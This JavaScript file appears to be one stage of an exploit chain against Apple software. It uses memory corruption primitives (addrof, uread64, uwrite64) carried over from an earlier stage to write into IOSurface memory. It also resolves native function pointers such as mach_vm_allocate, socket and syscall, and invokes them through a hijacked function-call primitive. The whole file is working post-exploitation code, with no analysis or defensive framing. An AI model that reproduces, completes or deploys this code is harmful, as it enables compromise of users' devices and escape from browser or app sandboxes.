// PE main - minimal: just test fcall_init
// IOSurface direct-write logging for immediate visibility
globalThis.pw = function() {};
globalThis._surf = 0n;
globalThis._log_offset_ptr = 0n;

// Initialize IOSurface logging before any fcall
try {
  // Read surface_address_remote from func_offsets[19]
  // func_offsets_array is a global defined by pe_stage_1
  // Read buffer pointer first (two-step like pe_stage_1 fcall_init)
  let _fob_buf = uread64(addrof(func_offsets_array) + 0x10n);
  let _surf = uread64(_fob_buf + 19n * 0x8n);
  if (_surf && _surf != 0n) {
    globalThis._surf = _surf;
    globalThis._log_offset_ptr = _surf + 0xFE00n;
  }
	} catch(e) {
	  // If we can't read func_offsets_array, IOSurface logging won't work
	  // but at least we caught it before fcall_init
	}

function iosurf_log(msg) {
  if (!globalThis._surf || globalThis._surf == 0n) return;
  try {
    let off = uread64(globalThis._log_offset_ptr);
    // Check bounds (max 0xE00 bytes total)
    if (off + 256n >= 0xE00n) return;

    for (let i = 0n; i < BigInt(msg.length); i++) {
      uwrite8(globalThis._surf + 0xF000n + off + i, BigInt(msg.charCodeAt(Number(i))));
    }
    // Append newline
    uwrite8(globalThis._surf + 0xF000n + off + BigInt(msg.length), 0x0an);
    // Update offset pointer
    uwrite64(globalThis._log_offset_ptr, off + BigInt(msg.length) + 1n);
  } catch(e2) {
    // Silent fail - at least we tried
  }
}

// pw writes to IOSurface IMMEDIATELY - works before fcall_init
globalThis.pw = function(s) {
  iosurf_log("[PE] " + (s || ""));
};

// Fallback: if IOSurface logging failed, use pe_log_buf directly
if (!globalThis._surf || globalThis._surf == 0n) {
  try {
    let _fob_buf2 = uread64(addrof(func_offsets_array) + 0x10n);
    let _js_inputs = uread64(_fob_buf2 + 2n * 0x8n);
    let _lb = uread64(_js_inputs + 0x10n);
    let _lb_off_ptr = uread64(_js_inputs + 0x18n);
    if (_lb != 0n && _lb_off_ptr != 0n) {
      globalThis._surf = _lb;
      globalThis._log_offset_ptr = _lb_off_ptr;
      iosurf_log = function(msg) {
        try {
          let off = uread64(globalThis._log_offset_ptr);
          if (off + 256n < 0x4000n) {
            for (let i = 0n; i < BigInt(msg.length); i++) {
              uwrite8(globalThis._surf + off + i, BigInt(msg.charCodeAt(Number(i))));
            }
            uwrite8(globalThis._surf + off + BigInt(msg.length), 0x0an);
            uwrite64(globalThis._log_offset_ptr, off + BigInt(msg.length) + 1n);
          }
        } catch(e2) {}
      };
      globalThis.pw = function(s) {
        iosurf_log("[PE] " + (s || ""));
      };
    }
  } catch(e3) {}
}

pw("START: pe_main_minimal.js executing");

try {
  fcall_init();
  pw("fcall_init OK");

  // Read pre-resolved function pointers from func_offsets_buffer
  // Indices: 0-13 = sbx1 fcall chain, 14-19 = basics, 20-45 = expanded set
  let _fob_buf = uread64(addrof(func_offsets_array) + 0x10n);
  let read_fo = (idx) => uread64(_fob_buf + BigInt(idx) * 0x8n);

  // Read expanded set [20-45]
  let _CALLOC     = read_fo(20);  pw("fo[20] calloc=" + _CALLOC.hex());
  let _USLEEP     = read_fo(21);  pw("fo[21] usleep=" + _USLEEP.hex());
  let _CLOSE      = read_fo(22);
  let _MVA        = read_fo(23);  pw("fo[23] mach_vm_allocate=" + _MVA.hex());
  let _MVD        = read_fo(24);
  let _MPA        = read_fo(25);
  let _MPDA       = read_fo(26);
  let _SYSCALL    = read_fo(27);
  let _MME64      = read_fo(28);
  let _SLEEP      = read_fo(29);
  let _SOCKET     = read_fo(30);  pw("fo[30] socket=" + _SOCKET.hex());
  let _CONNECT    = read_fo(31);
  let _SSO        = read_fo(32);
  let _GSO        = read_fo(33);
  let _OBJC_ALLOC = read_fo(34);
  let _OBJC_ALLOC_INIT = read_fo(35);
  let _OBJC_GETCLASS   = read_fo(36);
  let _OBJC_MSGSEND    = read_fo(37);
  let _SEL_REGNAME     = read_fo(38);
  let _OBJC_RELEASE    = read_fo(39);
  let _CFSCS       = read_fo(40);
  let _CFR         = read_fo(41);
  let _kCFAllocDef = read_fo(45); pw("fo[45] kCFAllocatorDefault=" + _kCFAllocDef.hex());

  // Verify key functions are non-zero
  let ok = true;
  if (_CALLOC == 0n)     { pw("MISSING: calloc"); ok = false; }
  if (_MVA == 0n)        { pw("MISSING: mach_vm_allocate"); ok = false; }
  if (_SOCKET == 0n)     { pw("MISSING: socket"); ok = false; }
  if (ok) pw("All pre-resolved functions OK");

  // Test calloc via fcall
  let test_buf = fcall(_CALLOC, 1n, 8n);
  pw("calloc test: " + test_buf.hex());

  // Test getpid
  let _GETPID = read_fo(14);
  let pid = fcall(_GETPID);
  pw("getpid() = " + pid);

  // Now also set print as secondary output
  let _old_pw = globalThis.pw;
  globalThis.pw = function(s) {
    _old_pw(s);
    try { print(s); } catch(e) {}
  };
} catch(e) {
  pw("FAILED: " + (e.message || e));
  try {
    globalThis.pw = print;
    pw("FAILED(print): " + (e.message || e));
  } catch(e2) {
    pw("FAILED(print also failed)");
  }
}

pw("DONE");